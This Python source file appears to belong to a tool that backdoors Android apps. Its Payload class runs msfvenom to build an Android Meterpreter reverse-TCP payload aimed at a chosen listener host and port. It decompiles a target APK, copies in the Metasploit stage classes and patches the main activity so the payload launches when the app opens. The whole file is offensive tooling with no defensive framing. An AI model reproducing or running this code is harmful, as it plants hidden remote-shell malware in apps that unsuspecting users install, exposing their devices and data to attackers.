import logging
import os
import glob
import shutil

from .apk import Apk
from . import utilities


class Payload:
    def __init__(self, host, public_host=None):
        self.__payload_apk = None
        self.host = host
        self.public_host = public_host if public_host else host
        self.__generate_payload()

    def __generate_payload(self):
        payload_path = os.path.join(os.getcwd(), 'payload.apk')
        command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={self.public_host.ip} LPORT={self.public_host.port} -o {payload_path}"
        logging.info('Generating payload...')
        utilities.run_command(command)
        logging.info('    ... Done')
        self.__payload_apk = Apk(payload_path)

    def inject(self, apk):
        self.__payload_apk.decompile()

        apk.decompile()

        metasploit_package = 'com/metasploit/stage'
        files_to_copy = glob.glob(os.path.join(
            self.__payload_apk.decompiled_path, 'smali/', metasploit_package, '*Payload*.smali'
        ))
        copy_dest = os.path.join(apk.decompiled_path, 'smali/', metasploit_package)
        if not os.path.exists(copy_dest):
            logging.info(f"Creating folder: '{copy_dest}'")
            os.makedirs(copy_dest)
        for file in files_to_copy:
            logging.info(f"Copying file '{file}' to '{copy_dest}'")
            shutil.copy(file, copy_dest)

        main_activity, main_activity_file = apk.get_main_activity()
        logging.info(f"The main activity is: '{main_activity}'")
        with open(main_activity_file, 'r') as f:
            logging.debug('Reading from Main Activity file')
            main_activity_content = f.read()
        to_find = ';->onCreate(Landroid/os/Bundle;)V'
        to_add = 'invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V'
        logging.debug('Inserting the payload invocation in the Main Activity')
        main_activity_content = main_activity_content.replace(to_find, to_find + '\n    ' + to_add)
        with open(main_activity_file, 'w') as f:
            logging.debug('Writing the Main Activity file')
            f.write(main_activity_content)

        self.__inject_permissions(apk)

        logging.info('Removing decompiled payload...')
        self.__payload_apk.remove_decompiled()
        logging.info('    ... Done')

    def __inject_permissions(self, apk):
        pass

    def delete(self):
        logging.info('Deleting payload APK...')
        os.remove(self.__payload_apk.full_path)
        logging.info('    ... Done')
